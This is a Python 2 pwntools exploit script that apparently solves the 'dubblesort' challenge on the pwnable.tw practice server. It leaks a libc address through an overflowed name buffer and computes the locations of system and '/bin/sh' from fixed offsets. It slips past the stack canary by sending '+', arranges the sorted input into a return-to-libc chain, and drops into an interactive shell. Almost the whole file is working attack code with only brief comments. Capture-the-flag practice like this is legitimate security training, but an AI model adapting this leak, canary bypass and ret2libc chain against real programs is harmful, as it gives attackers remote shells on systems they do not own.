#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

ready = True
if ready:
    conn = connect('chall.pwnable.tw', 10101)
else:
    conn = process('/home/doublesine/Desktop/dubblesort')


read = conn.read()
print read,
send = 'fuck' * 6
print(send)
conn.sendline('fuck' * 6)

read = conn.read()
print read,
sort_count = 8 + 64 // 4 + 1 + 7 + 1 + 1 + 1
send = str(sort_count)
print(send)
conn.sendline(send)

libc_addr = unpack(read[len('Hello ' + 'fuck' * 6):len('Hello ' + 'fuck' * 6) + 4], 32) - ord('\n') - 0x1b0000
libc_binsh_str_addr = libc_addr + 0x00158E8B
libc_system_addr = libc_addr + 0x0003A940
print('libc_addr = 0x%08x' % libc_addr)
print('libc_binsh_str_addr = 0x%08x' % libc_binsh_str_addr)
print('libc_system_addr = 0x%08x' % libc_system_addr)

# filling with whatever you want
# but must be less than canary
for i in range(0, 8 + 64 // 4):
    read = conn.read()
    print read,
    send = '0'
    print(send)
    conn.sendline(send)

# reserve canary
read = conn.read()
print read,
send = '+'
print(send)
conn.sendline(send)

# filling with whatever you want
# but must be less than libc_system_addr
for i in range(0, 7):
    read = conn.read()
    print read,
    send = str(libc_system_addr - 8)
    print(send)
    conn.sendline(send)

# filling with 'libc_system_addr'
read = conn.read()
print read,
send = str(libc_system_addr)
print(send)
conn.sendline(send)

# filling with whatever you want
# but must be less than 'libc_binsh_str_addr' and greater than 'libc_system_addr'
read = conn.read()
print read,
send = str(libc_binsh_str_addr - 8)
print(send)
conn.sendline(send)

# filling with 'libc_binsh_str_addr'
read = conn.read()
print read,
send = str(libc_binsh_str_addr)
print(send)
conn.sendline(send)

conn.interactive()  # you will get shell here
conn.close()
